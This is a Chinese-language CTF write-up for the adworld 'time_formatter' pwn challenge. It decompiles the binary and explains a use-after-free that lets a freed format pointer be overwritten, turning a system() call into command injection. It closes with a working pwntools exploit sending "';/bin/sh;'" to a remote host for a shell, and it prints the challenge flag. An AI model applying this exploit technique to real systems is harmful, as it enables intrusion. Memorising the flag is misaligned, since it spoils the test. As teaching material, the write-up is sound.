# time_formatter

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=0e224e2b-6488-4ca4-8187-c17912aef083_2)

到堆了，我不会了。

运行程序发现是经典的菜单类型程序。

- Welcome to Mary's Unix Time Formatter!
<br>1) Set a time format.
<br>2) Set a time.
<br>3) Set a time zone.
<br>4) Print your time.
<br>5) Exit.

checksec看下。

-   Arch:     amd64-64-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x400000)
    <br>FORTIFY:  Enabled

有个新玩意。

- ### FORTIFY
  > 1.包含%n的格式化字符串不能位于程序内存中的可写地址。<br>
  > 2.当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。）

把格式化字符串针对到死。ghidra反编译main函数如下。

```c
undefined  [16] Main(void)
{
  __gid_t __rgid;
  undefined4 uVar1;
  int iVar2;
  ulong in_RCX;
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  setbuf(stdout,(char *)0x0);
  puts("Welcome to Mary\'s Unix Time Formatter!");
switchD_00400af6_caseD_5:
  do {
    puts("1) Set a time format.");
    puts("2) Set a time.");
    puts("3) Set a time zone.");
    puts("4) Print your time.");
    puts("5) Exit.");
    __printf_chk(1,&DAT_004012ba);
    fflush(stdout);
    uVar1 = GetInput();
    switch(uVar1) {
    case 1:
      iVar2 = SetTimeFormat();
      break;
    case 2:
      iVar2 = SetTime();
      break;
    case 3:
      iVar2 = SetTimeZone();
      break;
    case 4:
      iVar2 = PrintTime();
      break;
    case 5:
      iVar2 = Exit();
      break;
    default:
      goto switchD_00400af6_caseD_5;
    }
    if (iVar2 != 0) {
      return ZEXT816(in_RCX) << 0x40;
    }
  } while( true );
}
```

看不出来什么东西，只是调用了一些函数。把选项的函数都看一遍。

```c
undefined8 SetTimeFormat(void)
{
  int iVar1;
  undefined8 uVar2;
  uVar2 = GetContent("Format: ");
  iVar1 = CheckFormat(uVar2);
  if (iVar1 == 0) {
    puts("Format contains invalid characters.");
    FreePointer(uVar2);
  }
  else {
    format = uVar2;
    puts("Format set.");
  }
  return 0;
}
```

发现指针，事情不妙。

```c
undefined  [16] SetTime(void)
{
  int iVar1;
  ulong in_RCX;
  char *__s;
  __printf_chk(1,"Enter your unix time: ");
  fflush(stdout);
  iVar1 = GetInput();
  __s = "Unix time must be positive";
  if (-1 < iVar1) {
    __s = "Time set.";
    time = iVar1;
  }
  puts(__s);
  return ZEXT816(in_RCX) << 0x40;
}
```

这里又没有指针了。

```c
undefined  [16] SetTimeZone(void)
{
  ulong in_RAX;
  timeZone = GetContent("Time zone: ");
  puts("Time zone set.");
  return ZEXT816(in_RAX) << 0x40;
}
```

其实这里也有指针，只是隐藏在GetContent中。估计pwn是跟指针有关的内容了。

```c
undefined8 PrintTime(undefined8 param_1,undefined8 param_2,undefined8 param_3)
{
  char *pcVar1;
  long in_FS_OFFSET;
  char local_810 [2048];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (format == 0) {
    puts("You haven\'t specified a format!");
  }
  else {
    __snprintf_chk(local_810,2048,1,2048,"/bin/date -d @%d +\'%s\'",time,format,param_3);
    __printf_chk(1,"Your formatted time is: ");
    fflush(stdout);
    pcVar1 = getenv("DEBUG");
    if (pcVar1 != (char *)0x0) {
      __fprintf_chk(stderr,1,"Running command: %s\n",local_810);
    }
    setenv("TZ",timeZone,1);
    system(local_810);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

发现system出没。这里应该就是pwn目标了。

```c
bool Exit(void)
{
  long in_FS_OFFSET;
  bool bVar1;
  byte local_20 [16];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FreePointer(format);
  FreePointer(timeZone);
  __printf_chk(1,"Are you sure you want to exit (y/N)? ");
  fflush(stdout);
  fgets((char *)local_20,16,stdin);
  bVar1 = (local_20[0] & 0xdf) == 0x59;
  if (bVar1) {
    puts("OK, exiting.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return bVar1;
}
```

free指针但是又不直接退出的行为有点可疑。重点看format和timeZone指针被设置的函数，发现都调用了GetContent。看看里面有啥。

```c
void GetContent(undefined8 param_1)
{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_410 [1024];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __printf_chk(1,&DAT_0040110f,param_1);
  fflush(stdout);
  fgets(local_410,1024,stdin);
  sVar1 = strcspn(local_410,"\n");
  local_410[sVar1] = '\0';
  FUN_00400c26(local_410);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

- ### __printf_chk
  > 使用格式化字符串打印内容，同时检查栈。
  - 语法：int __printf_chk(int flag, const char * format);
  - 和printf几乎一致，但计算输出结果前会先根据flag的值检查栈溢出。flag的值越高，对栈和参数的检查安全度越高。

给予残血的格式化字符串漏洞致命一击。基本可以断定这个程序里格式化字符串没办法用了。

- ### strcspn
  > 检索字符串 str1 开头连续有几个字符都不含字符串 str2 中的字符。
  - 声明：size_t strcspn(const char *str1, const char *str2)
  - 参数：
    > str1 -- 要被检索的 C 字符串。<br>
    > str2 -- 该字符串包含了要在 str1 中进行匹配的字符列表。
  - 返回值：返回 str1 开头连续都不含字符串 str2 中字符的字符数。

配合下面的 local_410[sVar1] = '\0'; 语句作用为将输入的字符串最后一位加个\0。

```c
undefined  [16] FUN_00400c26(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)
{
  char *pcVar1;
  char *pcVar2;
  pcVar1 = strdup(param_1);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = (char *)err(1,"strdup");
  }
  pcVar2 = getenv("DEBUG");
  if (pcVar2 != (char *)0x0) {
    __fprintf_chk(stderr,1,"strdup(%p) = %p\n",param_1,pcVar1);
  }
  return CONCAT88(param_4,pcVar1);
}
```

strdup函数的操作涉及到堆。详情见[这里](https://stackoverflow.com/questions/252782/strdup-what-does-it-do-in-c)。我是省流管家：此函数内部分配传入参数大小的一块空间，并返回一个指向这块空间的指针。这块空间存储着跟传入参数相同的字符串。

内部使用了malloc。malloc加上刚刚的free会让我这个萌新想到什么呢？UAF。还记得PrintTime中会使用system执行local_810吗？我们只要让local_810包含getshell的命令就行了。

- ### snprintf
  > 将可变参数(...)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。
  - 声明：int snprintf ( char * str, size_t size, const char * format, ... );
  - 参数
    > str -- 目标字符串。<br>
    > size -- 拷贝字节数(Bytes)。
    > format -- 格式化成字符串。
    > ... -- 可变参数。

跟__snprintf_chk的套路一样，__snprintf_chk和snprintf差不多，就是检查了栈。local_810中的内容应该为/bin/date -d @time +\'format\'。此处有个命令注入。linux中命令之间用;分割，所以我们可以在format的payload中包含;号，然后接着getshell的命令。问题是format有过滤，不能包含分号。是时候放出UAF了。

UAF简述一下就是释放的指针被重新使用。底层原理涉及很多，简述就是在malloc内存然后free释放掉后，指针的值并不会消失。假设之前malloc了0x20这么大的内存，free掉但是不将指针置为null，后面再次malloc 0x20这么大的内存时就会优先考虑之前free掉的同样大小的内存。这么一套流程下来，两个不一样地方的malloc将会一前一后分配到同样的指针。

程序中另一个涉及到malloc的函数是SetTimeZone，且没有任何过滤。计划如下：

1.先去SetTimeFormat，输入两个字节大小的内容（对应/bin/sh，这样保险一点，但是可能输入更多的内容也行？），让程序malloc出一块内存。
2.Exit释放掉刚刚的指针，但此时那个指针还是有值的。
3.再去 SetTimeZone，输入';/bin/sh;',此时系统会为我们分配一块内存，但是和第一步分配到的一样。
4.调用PrintTime，执行payload。

PrintTime中会要求format指针不为空。虽然第二步free掉后我们没有再设置format，但是format中仍然存有第一步的指针值。第三步也会分配到同样的指针所指的内存，所以我们可以任意修改里面的值。';/bin/sh;'两边的单引号是为了闭合/bin/date -d @time +\'format\'的format两边的单引号，就喝sql注入一样。

然后就能getshell了！因为最后format指针所指的空间已经被第三步修改为getshell字符串了。

```python
from pwn import *
proc=remote('61.147.171.105',65429)
proc.sendlineafter('> ',b'1')
proc.sendline(b'aa')
proc.sendlineafter('> ',b'5')
proc.sendline(b'N')
proc.sendlineafter('> ',b'3')
proc.sendline(b"';/bin/sh;'")
proc.sendlineafter('> ',b'4')
proc.interactive()
```

- ### Flag
  > cyberpeace{859c08d0d76ff65b4291e4c6e114c21e}